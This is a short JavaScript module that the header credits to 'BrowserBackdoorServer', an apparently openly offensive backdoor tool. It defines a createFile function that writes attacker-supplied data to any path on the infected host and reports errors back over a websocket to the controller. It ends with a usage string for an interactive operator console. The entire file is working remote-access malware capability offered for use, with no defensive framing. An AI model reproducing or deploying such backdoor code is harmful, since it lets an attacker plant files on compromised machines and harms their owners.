// INTERACTIVE
/*
 * Copyright (c) 2016 Carleton Stuberg - http://imcpwn.com
 * BrowserBackdoorServer by IMcPwn.
 * See the file 'LICENSE' for copying permission
 *
 * Info: Creates a file
 * Parameters: fullPath, Data in file
 * Returns: undefined, error
 * Author: IMcPwn
 */

if (typeof fs === typeof undefined) fs = require('fs');

createFile = function (fullPath, data) {
    fs.writeFile(fullPath, data, function(err) {
        if (err) ws.send(err);
    }); 
}

return "Usage: createFile(fullPath, data)";